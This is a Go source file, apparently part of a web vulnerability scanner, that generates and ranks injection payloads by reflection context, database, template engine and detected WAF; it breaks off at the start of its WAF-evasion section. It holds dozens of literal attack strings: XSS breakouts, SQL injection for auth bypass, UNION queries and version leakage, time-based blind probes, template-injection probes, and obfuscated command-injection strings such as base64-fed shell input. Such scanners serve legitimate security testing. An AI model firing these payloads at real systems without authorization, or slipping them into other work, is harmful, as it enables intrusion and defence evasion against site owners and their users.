package payloadgen

import (
	"crypto/sha256"
	"fmt"
	"sort"
	"strings"

	"github.com/akha-security/akca/engine/internal/deeptraversal"
	"github.com/akha-security/akca/engine/internal/nosql"
	"github.com/akha-security/akca/engine/internal/reflection"
	"github.com/akha-security/akca/engine/internal/wafintel"
)

func Generate(in Input) GenerationResult {
	in = normalizeInput(in)
	candidates := buildCandidates(in)
	skipped := skippedFamilies(in, candidates)

	compatible := applyProfileCompatibility(candidates, in.Profile)
	skipped = appendUniqueSkips(skipped, compatibilitySkips(candidates, compatible, in.Profile)...)

	filtered := applyLearning(compatible, in.Learn)
	skipped = appendUniqueSkips(skipped, learningSkips(compatible, filtered, in.Learn)...)
	filtered = semanticDedupe(filtered)
	sortPayloads(filtered)
	selected, used := selectPayloads(filtered, in.Budget)
	testCases := buildTestCases(selected)
	estimated := estimateRequests(selected)

	return GenerationResult{
		EndpointURL:       in.Profile.EndpointURL,
		Parameter:         in.Profile.Parameter,
		Tech:              in.Tech,
		Payloads:          selected,
		TestCases:         testCases,
		EstimatedRequests: estimated,
		Shadow:            compareShadow(selected, testCases, used),
		Skipped:           skipped,
		BudgetUsed:        used,
		BudgetLimit:       in.Budget,
	}
}

func normalizeInput(in Input) Input {
	if in.Profile.Context == "" {
		in.Profile.Context = reflection.ContextUnknown
	}
	if strings.TrimSpace(in.Profile.CanaryValue) == "" {
		in.Profile.CanaryValue = stableControlValue(in.Profile, "canary")
	}
	return in
}

func stableControlValue(p reflection.ReflectionProfile, purpose string) string {
	seed := strings.Join([]string{
		p.ScanID, p.EndpointURL, p.Method, p.Parameter, p.ParameterLocation, purpose,
	}, "|")
	sum := sha256.Sum256([]byte(seed))
	return fmt.Sprintf("akca-%s-%x", purpose, sum[:6])
}

func buildCandidates(in Input) []Payload {
	p := in.Profile
	var out []Payload

	add := func(pl Payload) {
		out = append(out, pl)
	}

	add(Payload{
		Value: p.CanaryValue, VulnClass: "control", Variant: "canary", Family: "control",
		ExpectedSignal: "baseline_reflection", Encoding: "none", Priority: 100, NoiseLevel: "low",
		BudgetCost: 1, VerificationStrategy: "baseline_compare", SelectionReason: "canary control",
		RequiredContext: string(p.Context), RiskLevel: "safe", IsControl: true,
	})
	add(Payload{
		Value: stableControlValue(p, "negative"), VulnClass: "control", Variant: "negative", Family: "control",
		ExpectedSignal: "no_reflection", Encoding: "none", Priority: 95, NoiseLevel: "low",
		BudgetCost: 1, VerificationStrategy: "negative_control", SelectionReason: "negative control",
		RequiredContext: string(p.Context), RiskLevel: "safe", IsNegativeControl: true,
	})

	// ReflectionRemoved does not imply safety: stored, DOM, parser and blind
	// sinks may not echo the canary. Keep ContextUnknown so the polyglot suite is
	// used instead of incorrectly assuming an HTML-body reflection.

	for _, pl := range xssPayloads(p) {
		add(pl)
	}
	if shouldIncludeSQLi(in) {
		for _, pl := range sqliPayloads(p, in.Tech) {
			add(pl)
		}
	}
	if shouldIncludeNoSQLi(in) {
		for _, pl := range nosqlPayloads(p) {
			add(pl)
		}
	}
	if shouldIncludeSSTI(in) {
		for _, pl := range sstiPayloads(p, in.Tech) {
			add(pl)
		}
	}
	if shouldIncludeCmdInj(in) {
		for _, pl := range cmdPayloads(p, in.Tech) {
			add(pl)
		}
	}

	// WAF evasion: transform offensive payloads to the detected WAF and try the
	// adapted variants alongside the originals.
	out = append(out, wafEvasionVariants(in, out)...)
	for i := range out {
		out[i] = normalizePayload(out[i], p)
		out[i] = rankForTech(out[i], in.Tech)
		out[i] = rankForWAFLearning(out[i], in.WAF)
	}

	return out
}

func normalizePayload(pl Payload, profile reflection.ReflectionProfile) Payload {
	pl.VulnClass = strings.ToLower(strings.TrimSpace(pl.VulnClass))
	pl.Family = strings.ToLower(strings.TrimSpace(pl.Family))
	if pl.Family == "" {
		pl.Family = pl.VulnClass
	}
	pl.Variant = strings.TrimSpace(pl.Variant)
	pl.ExpectedSignal = strings.ToLower(strings.TrimSpace(pl.ExpectedSignal))
	if pl.Encoding == "" {
		pl.Encoding = "none"
	}
	if pl.TransportEncoding == "" {
		pl.TransportEncoding = transportEncodingForProfile(profile)
	}
	if pl.BudgetCost <= 0 {
		pl.BudgetCost = 1
	}
	if pl.EstimatedRequests <= 0 {
		pl.EstimatedRequests = estimatedRequestsForPayload(pl)
	}
	if pl.NoiseLevel == "" {
		pl.NoiseLevel = "medium"
	}
	if pl.RequiredContext == "" {
		pl.RequiredContext = string(profile.Context)
	}
	if pl.RiskLevel == "" {
		pl.RiskLevel = "active"
	}
	if pl.IsControl || pl.IsNegativeControl {
		pl.RiskLevel = "safe"
	}
	if pl.VerificationStrategy == "" {
		pl.VerificationStrategy = "signal_compare"
	}
	if pl.Technique == "" {
		pl.Technique = inferTechnique(pl)
	}
	if pl.ProbeRole == "" {
		pl.ProbeRole = inferProbeRole(pl)
	}
	if pl.SelectionReason == "" {
		pl.SelectionReason = pl.VulnClass + " candidate"
	}
	pl.Priority = clampPriority(pl.Priority)
	pl = rankForProfile(pl, profile)
	pl.SemanticKey = semanticKey(pl)
	return pl
}

func clampPriority(priority int) int {
	if priority < 0 {
		return 0
	}
	if priority > 100 {
		return 100
	}
	return priority
}

func rankForProfile(pl Payload, profile reflection.ReflectionProfile) Payload {
	if pl.IsControl || pl.IsNegativeControl {
		return pl
	}
	location := strings.ToLower(strings.TrimSpace(profile.ParameterLocation))
	contentType := strings.ToLower(profile.ContentType)

	if profile.Stable && (pl.Family == "xss" || pl.Family == "ssti") {
		pl.Priority += 4
	}
	if !profile.Stable && (pl.Family == "xss" || pl.Family == "ssti") {
		pl.Priority -= 8
		pl.SelectionReason += "; deprioritized on unstable reflection"
	}
	if profile.HoneypotSuspected {
		pl.Priority -= 20
		pl.SelectionReason += "; cautious ranking for suspected honeypot"
	}
	if strings.Contains(contentType, "json") || location == "json" || location == "graphql" {
		switch pl.Family {
		case "nosql":
			pl.Priority += 12
		case "sqli", "ssti":
			pl.Priority += 3
		}
	}
	if location == "header" || location == "cookie" {
		if pl.Family == "xss" {
			pl.Priority -= 10
		}
		if pl.Family == "command_injection" || pl.Family == "sqli" {
			pl.Priority += 2
		}
	}
	if pl.Family == "xss" && profile.Context == reflection.ContextAttribute {
		quote := strings.ToLower(strings.TrimSpace(profile.QuoteType))
		switch {
		case strings.Contains(quote, "single") && strings.Contains(pl.Variant, "single"):
			pl.Priority += 6
		case strings.Contains(quote, "double") && !strings.Contains(pl.Variant, "single"):
			pl.Priority += 6
		case quote != "" && quote != "none":
			pl.Priority -= 3
		}
	}
	if pl.WAFAdapted {
		pl.Priority += 5
	}
	pl.Priority = clampPriority(pl.Priority)
	return pl
}

func rankForTech(pl Payload, tech TechHints) Payload {
	if pl.Family != "sqli" || pl.IsControl || pl.IsNegativeControl {
		return pl
	}
	detected := normalizeDatabaseFamily(tech.Database)
	payloadDB := payloadDatabaseFamily(pl)
	if detected == "" || payloadDB == "" {
		return pl
	}
	if detected == payloadDB {
		pl.Priority += 12
		pl.SelectionReason += "; boosted by matching " + detected + " fingerprint"
	} else {
		pl.Priority -= 18
		pl.SelectionReason += "; fallback for non-matching database fingerprint"
	}
	pl.Priority = clampPriority(pl.Priority)
	return pl
}

func rankForWAFLearning(pl Payload, waf WAFHints) Payload {
	if !pl.WAFAdapted || len(waf.PreferredTechniques) == 0 {
		return pl
	}
	encoding := strings.ToLower(strings.TrimSpace(pl.Encoding))
	for i, technique := range waf.PreferredTechniques {
		technique = strings.ToLower(strings.TrimSpace(technique))
		if technique == "" || strings.HasPrefix(technique, "protocol:") {
			continue
		}
		if encodingTechniqueMatches(encoding, technique) {
			boost := 12 - i*2
			if boost < 2 {
				boost = 2
			}
			pl.Priority += boost
			pl.SelectionReason += "; boosted by WAF learning for " + technique
			break
		}
	}
	pl.Priority = clampPriority(pl.Priority)
	return pl
}

func encodingTechniqueMatches(encoding, technique string) bool {
	if encoding == technique {
		return true
	}
	for _, part := range strings.Split(encoding, "_") {
		if part == technique {
			return true
		}
	}
	return strings.Contains(encoding, technique)
}

func normalizeDatabaseFamily(database string) string {
	db := strings.ToLower(database)
	switch {
	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
		return "mysql"
	case strings.Contains(db, "postgres"):
		return "postgres"
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		return "mssql"
	case strings.Contains(db, "oracle"):
		return "oracle"
	case strings.Contains(db, "sqlite"):
		return "sqlite"
	default:
		return ""
	}
}

func payloadDatabaseFamily(pl Payload) string {
	haystack := strings.ToLower(pl.Variant + " " + pl.ExpectedSignal + " " + pl.Value)
	switch {
	case strings.Contains(haystack, "pg_sleep") || strings.Contains(haystack, "pg_cast") || strings.Contains(haystack, "postgres"):
		return "postgres"
	case strings.Contains(haystack, "waitfor") || strings.Contains(haystack, "mssql") || strings.Contains(haystack, "convert"):
		return "mssql"
	case strings.Contains(haystack, "dbms_") || strings.Contains(haystack, "oracle") || strings.Contains(haystack, "ctxsys") || strings.Contains(haystack, "utl_inaddr"):
		return "oracle"
	case strings.Contains(haystack, "randomblob") || strings.Contains(haystack, "sqlite"):
		return "sqlite"
	case strings.Contains(haystack, "sleep") || strings.Contains(haystack, "benchmark") ||
		strings.Contains(haystack, "extractvalue") || strings.Contains(haystack, "updatexml") ||
		strings.Contains(haystack, "gtid_subset") || strings.Contains(haystack, "json_keys") ||
		strings.Contains(haystack, "group_concat") || strings.Contains(haystack, "mysql"):
		return "mysql"
	default:
		return ""
	}
}

// ---------------------------------------------------------------------------
// XSS (context aware)
// ---------------------------------------------------------------------------

func xssPayloads(p reflection.ReflectionProfile) []Payload {
	var out []Payload
	quote := strings.ToLower(strings.TrimSpace(p.QuoteType))
	switch p.Context {
	case reflection.ContextHTML:
		out = append(out, xssHTMLPayloads(p)...)
	case reflection.ContextAttribute:
		switch {
		case strings.Contains(quote, "single"):
			out = append(out,
				xssPayload(p, "attr_breakout_single", `' onmouseover=alert(1) x='`, "event_handler_single", 92, 2),
				xssPayload(p, "attr_focus_single", `' onfocus=alert(1) autofocus='`, "event_handler_single", 90, 2),
				xssPayload(p, "attr_close_single", `'><svg/onload=alert(1)>`, "tag_breakout", 88, 2),
			)
		case strings.Contains(quote, "none"):
			out = append(out,
				xssPayload(p, "attr_unquoted_focus", ` onfocus=alert(1) autofocus `, "event_handler", 92, 2),
				xssPayload(p, "attr_unquoted_over", ` onmouseover=alert(1) `, "event_handler", 90, 2),
				xssPayload(p, "attr_unquoted_close", `><svg/onload=alert(1)>`, "tag_breakout", 88, 2),
			)
		default: // double quote or generic
			out = append(out,
				xssPayload(p, "attr_breakout", `" onfocus=alert(1) autofocus="`, "event_handler", 92, 2),
				xssPayload(p, "attr_breakout_single", `' onmouseover=alert(1) x='`, "event_handler_single", 85, 2),
				xssPayload(p, "attr_close_tag", `"><img src=x onerror=alert(1)>`, "tag_breakout", 88, 2),
				xssPayload(p, "attr_svg_tag", `"><svg/onload=alert(1)>`, "tag_breakout", 86, 2),
			)
		}
	case reflection.ContextJavaScript:
		switch {
		case strings.Contains(quote, "backtick"):
			out = append(out,
				xssPayload(p, "js_template", "${alert(1)}", "js_template_eval", 95, 2),
				xssPayload(p, "js_template_breakout", "`+alert(1)+`", "js_template_eval", 90, 2),
				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
			)
		case strings.Contains(quote, "single"):
			out = append(out,
				xssPayload(p, "js_breakout_single", `';alert(1)//`, "js_execution", 94, 2),
				xssPayload(p, "js_expr_single", `'-alert(1)-'`, "js_execution", 89, 2),
				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
			)
		case strings.Contains(quote, "double"):
			out = append(out,
				xssPayload(p, "js_breakout_double", `";alert(1)//`, "js_execution_double", 94, 2),
				xssPayload(p, "js_expr_double", `"-alert(1)-"`, "js_execution_double", 89, 2),
				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
			)
		default:
			out = append(out,
				xssPayload(p, "js_breakout", `';alert(1)//`, "js_execution", 92, 2),
				xssPayload(p, "js_breakout_double", `";alert(1)//`, "js_execution_double", 90, 2),
				xssPayload(p, "js_template", "${alert(1)}", "js_template_eval", 85, 2),
				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
			)
		}
	case reflection.ContextURL:
		out = append(out,
			xssPayload(p, "url_scheme", `javascript:alert(1)`, "url_scheme_execution", 85, 2),
			xssPayload(p, "url_data", `data:text/html,<script>alert(1)</script>`, "url_data_scheme", 78, 2),
		)
	case reflection.ContextJSON:
		out = append(out,
			xssPayload(p, "json_break", `","x":"<img src=x onerror=alert(1)>"}`, "json_structure_break", 76, 2),
			xssPayload(p, "json_script", `</script><script>alert(1)</script>`, "json_script_break", 72, 2),
		)
	case reflection.ContextCSS:
		out = append(out,
			xssPayload(p, "css_expression", `</style><svg/onload=alert(1)>`, "style_breakout", 70, 2),
		)
	case reflection.ContextXML:
		out = append(out,
			xssPayload(p, "xml_cdata_breakout", `]]><svg/onload=alert(1)>`, "xml_cdata_breakout", 74, 2),
			xssPayload(p, "xml_tag_breakout", `</x><svg/onload=alert(1)>`, "xml_tag_breakout", 72, 2),
		)
	case reflection.ContextComment:
		out = append(out,
			xssPayload(p, "comment_breakout", `--><svg/onload=alert(1)>`, "comment_breakout", 76, 2),
			xssPayload(p, "comment_script_breakout", `--><script>alert(1)</script>`, "comment_script_breakout", 74, 2),
		)
	default:
		// Unknown/XML/comment context — send full polyglot suite (thorough scan).
		out = append(out, xssPolyglotPayloads(p)...)
	}
	return out
}

func xssHTMLPayloads(p reflection.ReflectionProfile) []Payload {
	return []Payload{
		xssPayload(p, "html_img_onerror", `<img src=x onerror=alert(1)>`, "dom_mutation", 92, 2),
		xssPayload(p, "html_svg_onload", `"><svg/onload=alert(1)>`, "dom_mutation_svg", 90, 2),
		xssPayload(p, "html_details", `<details/open/ontoggle=alert(1)>`, "dom_mutation_details", 84, 2),
		xssPayload(p, "html_iframe_srcdoc", `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`, "iframe_srcdoc", 80, 2),
		xssPayload(p, "html_audio_onerror", `<audio src=x onerror=alert(1)>`, "dom_mutation_audio", 82, 2),
		xssPayload(p, "html_video_source", `<video><source src=x onerror=alert(1)></video>`, "dom_mutation_video", 81, 2),
		xssPayload(p, "html_math_xlink", `<math><a xlink:href=javascript:alert(1)>x`, "dom_mutation_math", 79, 2),
	}
}

// xssPolyglotPayloads covers every common injection context when reflection context is unknown.
func xssPolyglotPayloads(p reflection.ReflectionProfile) []Payload {
	out := xssHTMLPayloads(p)
	out = append(out,
		xssPayload(p, "poly_attr", `" onfocus=alert(1) autofocus="`, "event_handler", 88, 2),
		xssPayload(p, "poly_js", `';alert(1)//`, "js_execution", 87, 2),
		xssPayload(p, "poly_script_break", `</script><svg/onload=alert(1)>`, "script_breakout", 86, 2),
		xssPayload(p, "poly_svg", `<svg/onload=alert(1)>`, "dom_mutation_svg", 85, 2),
		xssPayload(p, "poly_body", `<body onload=alert(1)>`, "dom_mutation", 84, 2),
		xssPayload(p, "poly_marquee", `<marquee onstart=alert(1)>`, "dom_mutation", 82, 2),
		xssPayload(p, "poly_url", `javascript:alert(1)`, "url_scheme_execution", 80, 2),
		xssPayload(p, "poly_json", `"><img src=x onerror=alert(1)>`, "json_structure_break", 78, 2),
	)
	return out
}

// ---------------------------------------------------------------------------
// SQLi (database aware)
// ---------------------------------------------------------------------------

func sqliPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
	var out []Payload
	out = append(out,
		sqliPayload(p, "error_single_quote", `'`, "sql_error", 72, 1),
		sqliPayload(p, "error_double_quote", `"`, "sql_error_dquote", 60, 1),
		sqliPayload(p, "error_backslash", `\`, "sql_error_backslash", 58, 1),
		sqliPayload(p, "error_paren_quote", `')`, "sql_error", 64, 1),
		sqliPayload(p, "error_double_paren", `")`, "sql_error_dquote", 62, 1),
		sqliPayload(p, "order_by_probe", `' ORDER BY 10-- -`, "sql_error", 65, 1),
		sqliPayload(p, "group_concat", `' AND 1=GROUP_CONCAT(1,2)-- -`, "sql_error", 63, 2),
		// Cross-database error functions
		sqliPayload(p, "extractvalue", `' AND extractvalue(1,concat(0x7e,version()))-- -`, "sql_error_extractvalue", 60, 2),
		sqliPayload(p, "updatexml", `' AND updatexml(1,concat(0x7e,version()),1)-- -`, "sql_error_updatexml", 58, 2),
		sqliPayload(p, "error_gtid_subset", `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -`, "sql_error_gtid", 68, 2),
		sqliPayload(p, "error_json_keys", `' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -`, "sql_error_json", 67, 2),
		sqliPayload(p, "error_mssql_convert", `' AND 1=CONVERT(INT, (SELECT @@version))-- -`, "sql_error_mssql", 68, 2),
		sqliPayload(p, "error_oracle_ctxsys", `' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1))-- -`, "sql_error_oracle", 66, 2),
		sqliPayload(p, "pg_cast_error", `' AND (SELECT 1 FROM CAST((SELECT version()) AS INT))--`, "sql_error", 71, 2),
		// Boolean & Auth bypass
		sqliPayload(p, "boolean_quoted_or", `' OR '1'='1`, "boolean_differential", 80, 2),
		sqliPayload(p, "boolean_numeric_or", ` OR 1=1`, "boolean_differential", 79, 2),
		sqliPayload(p, "boolean_paren_or", `') OR ('1'='1`, "boolean_differential", 81, 2),
		sqliPayload(p, "boolean_limit_or", `' OR 1=1 LIMIT 1-- -`, "boolean_differential", 78, 2),
		// Union-based
		sqliPayload(p, "union_select_null", `' UNION SELECT NULL,NULL,NULL-- -`, "union_select", 75, 2),
		sqliPayload(p, "union_all_nulls", `' UNION ALL SELECT NULL,NULL,NULL,NULL-- -`, "union_select", 74, 2),
		// Timing & Polyglots
		sqliPayload(p, "mysql_xor_if_sleep", `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`, "timing_mysql_xor", 82, 3),
		sqliPayload(p, "stacked_sleep", `'; SELECT SLEEP(5)-- -`, "timing_stacked", 62, 3),
		sqliPayload(p, "nested_sleep_quote", `",(select * from (select(sleep(10)))a)`, "timing_mysql_nested", 78, 2),
		sqliPayload(p, "nested_sleep_comma", `',(select * from (select(sleep(10)))a)-- -`, "timing_mysql_nested", 77, 2),
		sqliPayload(p, "waitfor_delay", `';WAITFOR DELAY '0:0:5'--`, "timing_mssql", 75, 3),
		sqliPayload(p, "waitfor_delay_spaced", `' WAITFOR DELAY '0:0:5'--`, "timing_mssql", 74, 3),
		sqliPayload(p, "pg_sleep_stacked", `'; SELECT pg_sleep(10)-- -`, "timing_postgres", 77, 3),
		sqliPayload(p, "pg_sleep_concat", `'||(SELECT pg_sleep(10))-- -`, "timing_postgres_concat", 76, 3),
		sqliPayload(p, "pg_sleep_and", `' AND (SELECT pg_sleep(10))-- -`, "timing_postgres", 75, 3),
		sqliPayload(p, "pg_sleep_nested", `",(SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres", 74, 3),
		sqliPayload(p, "pg_sleep_subquery", `' AND (SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres", 73, 3),
		sqliPayload(p, "sqli_polyglot_sleep", `SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/`, "timing_stacked", 69, 3),
	)

	db := strings.ToLower(tech.Database)
	lang := strings.ToLower(tech.BackendLanguage)

	switch {
	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
		out = append(out,
			sqliPayload(p, "mysql_gtid_error", `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -`, "sql_error_gtid", 75, 2),
			sqliPayload(p, "mysql_json_keys_error", `' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -`, "sql_error_json", 74, 2),
			sqliTime(p, "mysql_sleep", `' AND SLEEP(5)-- -`, "timing_mysql"),
			sqliTime(p, "mysql_sleep_numeric", ` AND SLEEP(5)`, "timing_mysql"),
			sqliTime(p, "mysql_xor_if_sleep_db", `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`, "timing_mysql_xor"),
			sqliTime(p, "mysql_sleep_paren", `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`, "timing_mysql_nested"),
			sqliTime(p, "mysql_sleep_double", `" AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`, "timing_mysql_nested"),
			sqliTime(p, "mysql_or_sleep", `' OR SLEEP(5)-- -`, "timing_mysql"),
			sqliTime(p, "mysql_benchmark", `' AND BENCHMARK(3000000,MD5(1))-- -`, "timing_mysql_benchmark"),
			sqliTime(p, "mysql_if_sleep", `' AND IF(1=1,SLEEP(5),0)-- -`, "timing_mysql_if"),
			sqliTime(p, "mysql_order_by_sleep", `(SELECT(SLEEP(5)))`, "timing_mysql_nested"),
		)
	case strings.Contains(db, "postgres"):
		out = append(out,
			sqliPayload(p, "pg_cast_num_error", `' AND (SELECT 1 FROM CAST((SELECT current_user) AS NUMERIC))-- -`, "sql_error", 70, 2),
			sqliTime(p, "pg_sleep", `'; SELECT pg_sleep(10)-- -`, "timing_postgres"),
			sqliTime(p, "pg_sleep_concat", `'||(SELECT pg_sleep(10))-- -`, "timing_postgres_concat"),
			sqliTime(p, "pg_sleep_and", `' AND (SELECT pg_sleep(10))-- -`, "timing_postgres"),
			sqliTime(p, "pg_sleep_from", `' AND (SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres"),
			sqliTime(p, "pg_sleep_null", `' AND (SELECT 1 FROM (SELECT pg_sleep(10))a)-- -`, "timing_postgres"),
		)
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		out = append(out,
			sqliPayload(p, "mssql_user_convert", `' AND 1=CONVERT(INT, (SELECT user_name()))-- -`, "sql_error_mssql", 70, 2),
			sqliTime(p, "mssql_waitfor", `'; WAITFOR DELAY '0:0:5'-- -`, "timing_mssql"),
			sqliTime(p, "mssql_waitfor_if", `' IF 1=1 WAITFOR DELAY '0:0:5'-- -`, "timing_mssql_if"),
		)
	case strings.Contains(db, "oracle"):
		out = append(out,
			sqliPayload(p, "oracle_utl_inaddr", `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -`, "sql_error_oracle", 70, 2),
			sqliTime(p, "oracle_sleep", `' AND DBMS_LOCK.SLEEP(5)-- -`, "timing_oracle"),
			sqliTime(p, "oracle_dbms_pipe", `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -`, "timing_oracle_pipe"),
		)
	case strings.Contains(db, "sqlite"):
		out = append(out,
			sqliPayload(p, "sqlite_cast_error", `' AND 1=CAST((SELECT sqlite_version()) AS INT)-- -`, "sql_error", 70, 2),
			sqliTime(p, "sqlite_randomblob", `' AND 1=randomblob(100000000)-- -`, "timing_sqlite"),
			sqliTime(p, "sqlite_hex_randomblob", `' AND 1=like('ABCDEFG',upper(hex(randomblob(50000000))))-- -`, "timing_sqlite"),
		)
	default:
		out = append(out,
			sqliTime(p, "generic_sleep", `' AND SLEEP(5)-- -`, "timing_generic"),
			sqliTime(p, "generic_pg_sleep", `'; SELECT pg_sleep(10)-- -`, "timing_postgres"),
			sqliTime(p, "generic_pg_sleep_concat", `'||(SELECT pg_sleep(10))-- -`, "timing_postgres_concat"),
			sqliTime(p, "generic_waitfor", `'; WAITFOR DELAY '0:0:5'-- -`, "timing_mssql"),
		)
		if lang != "" {
			out = append(out, sqliTime(p, "generic_benchmark", `' AND BENCHMARK(2000000,SHA1('akca'))-- -`, "timing_mysql_benchmark"))
		}
	}
	return out
}

func sqliTime(p reflection.ReflectionProfile, variant, value, signal string) Payload {
	pl := sqliPayload(p, variant, value, signal, 78, 3)
	pl.NoiseLevel = "high"
	pl.VerificationStrategy = "timing_differential"
	pl.SelectionReason = "database fingerprint supports time-based blind SQLi"
	return pl
}

// ---------------------------------------------------------------------------
// SSTI (template engine aware)
// ---------------------------------------------------------------------------

func sstiPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
	fw := strings.ToLower(tech.Framework)
	lang := strings.ToLower(tech.BackendLanguage)
	var out []Payload

	addEngine := func(variant, value, signal string, prio int) {
		out = append(out, sstiPayload(p, variant, value, signal, prio, 2))
	}

	switch {
	case strings.Contains(fw, "django") || strings.Contains(fw, "jinja") || strings.Contains(fw, "flask"):
		addEngine("jinja2", `{{11*13}}`, "ssti_eval_jinja", 74)
		addEngine("jinja2_parenthesized", `{{(17*19)}}`, "ssti_eval_jinja", 70)
		addEngine("jinja2_str_multiply", `{{7*'7'}}`, "ssti_eval_jinja", 68)
		addEngine("jinja2_statement", `{% print 23*29 %}`, "ssti_eval_jinja", 66)
	case strings.Contains(fw, "twig") || strings.Contains(fw, "symfony"):
		addEngine("twig", `{{17*19}}`, "ssti_eval_twig", 74)
		addEngine("twig_parenthesized", `{{(23*29)}}`, "ssti_eval_twig", 69)
		addEngine("twig_filter", `{{11|dump}}`, "ssti_eval_twig", 65)
	case strings.Contains(fw, "freemarker"):
		addEngine("freemarker", `${17*19}`, "ssti_eval_freemarker", 74)
		addEngine("freemarker_assign", `<#assign x=23*29>${x}`, "ssti_eval_freemarker", 68)
	case strings.Contains(fw, "velocity"):
		addEngine("velocity", `#set($x=6*6)$x`, "ssti_eval_velocity", 72)
	case strings.Contains(fw, "spring") || strings.Contains(fw, "thymeleaf"):
		addEngine("spel", `${3*3}`, "ssti_eval_spel", 72)
		addEngine("thymeleaf", `[[${11*11}]]`, "ssti_eval_thymeleaf", 70)
		addEngine("thymeleaf_expr", `[(7*7)]`, "ssti_eval_thymeleaf", 68)
	case strings.Contains(fw, "smarty"):
		addEngine("smarty", `{4*4}`, "ssti_eval_smarty", 72)
		addEngine("smarty_math", `{math equation="x*y" x=7 y=7}`, "ssti_eval_smarty", 68)
	case strings.Contains(fw, "handlebars") || strings.Contains(fw, "express") || strings.Contains(lang, "node") || strings.Contains(lang, "javascript"):
		addEngine("handlebars", `{{#with "s" as |x|}}{{/with}}`, "ssti_handlebars", 60)
		addEngine("erb_like", `<%= 5*5 %>`, "ssti_eval_erb", 66)
		addEngine("pug_jade", `#{7*7}`, "ssti_eval_pug", 68)
		addEngine("nunjucks", `{{range(1,2)}}`, "ssti_eval_nunjucks", 62)
	case strings.Contains(fw, "rails") || strings.Contains(lang, "ruby"):
		addEngine("erb", `<%= 5*5 %>`, "ssti_eval_erb", 72)
		addEngine("slim", `#{12*12}`, "ssti_eval_slim", 64)
	case strings.Contains(fw, "razor") || strings.Contains(lang, "asp") || strings.Contains(lang, ".net"):
		addEngine("razor", `@(11*13)`, "ssti_eval_razor", 72)
	default:
		// Unknown engine: uncommon math products reduce false positives vs 7*7=49.
		addEngine("jinja2", `{{133*97}}`, "ssti_eval_jinja", 70)
		addEngine("freemarker", `${149*83}`, "ssti_eval_freemarker", 68)
		addEngine("erb_like", `<%= 151*89 %>`, "ssti_eval_erb", 64)
		addEngine("go_template", `{{printf "%d" 12901}}`, "ssti_eval_go", 65)
	}
	return out
}

// ---------------------------------------------------------------------------
// Command injection (OS / language aware)
// ---------------------------------------------------------------------------

func cmdPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
	var out []Payload
	add := func(variant, value, signal string, prio int) {
		out = append(out, cmdPayload(p, variant, value, signal, prio, 2))
	}

	if isWindowsTech(tech) {
		add("win_amp_dir", `& dir`, "command_output_win", 65)
		add("win_amp_whoami", `& whoami`, "command_output_win_whoami", 63)
		add("win_pipe_whoami", `| whoami`, "command_output_win_whoami", 60)
		add("win_or_whoami", `|| whoami`, "command_output_win_whoami", 59)
		add("win_for_ping", `& ping -n 5 127.0.0.1`, "timing_win", 56)
		add("win_powershell_sleep", `& powershell -c "Start-Sleep -s 5"`, "timing_win", 55)
		add("win_obfuscated_cmd", `& c""o""m""p""s""p""e""c`, "command_output_win", 54)
		add("win_var_concat", `& set a=who&& set b=ami&& call %a%%b%`, "command_output_win_whoami", 52)
	} else {
		add("unix_semicolon_id", `;id`, "command_output", 64)
		add("unix_pipe_id", `|id`, "command_output_pipe", 62)
		add("unix_or_id", `|| id`, "command_output", 61)
		add("unix_subshell_id", `$(id)`, "command_output_subshell", 60)
		add("unix_backtick_id", "`id`", "command_output_backtick", 58)
		add("unix_and_id", `&& id`, "command_output_and", 56)
		add("unix_space_ifs_id", `;id${IFS}`, "command_output", 55)
		add("unix_newline_id", "%0aid", "command_output_newline", 54)
		add("unix_obfuscated_id", `;w'h'o'a'm'i`, "command_output", 53)
		add("unix_var_id", `;who$@ami`, "command_output", 52)
		add("unix_b64_id", `;sh<<<"aWQ="`, "command_output", 50)
		out = append(out,
			cmdTime(p, "unix_sleep", `;sleep 5`, "timing_unix"),
			cmdTime(p, "unix_sleep_pipe", `| sleep 5`, "timing_unix"),
			cmdTime(p, "unix_sleep_and", `&& sleep 5`, "timing_unix"),
		)
	}
	return out
}

func cmdTime(p reflection.ReflectionProfile, variant, value, signal string) Payload {
	pl := cmdPayload(p, variant, value, signal, 52, 3)
	pl.NoiseLevel = "high"
	pl.VerificationStrategy = "timing_differential"
	pl.SelectionReason = "shell metachar time-delay probe for command injection"
	return pl
}

func isWindowsTech(tech TechHints) bool {
	t := strings.ToLower(tech.BackendLanguage + " " + tech.Framework)
	return strings.Contains(t, "asp.net") || strings.Contains(t, "iis") ||
		strings.Contains(t, ".net") || strings.Contains(t, "windows")
}

// ---------------------------------------------------------------------------
// WAF evasion variants
// ---------------------------------------------------------------------------

// wafEvasionVariants produces WAF-adapted clones of offensive payloads using the
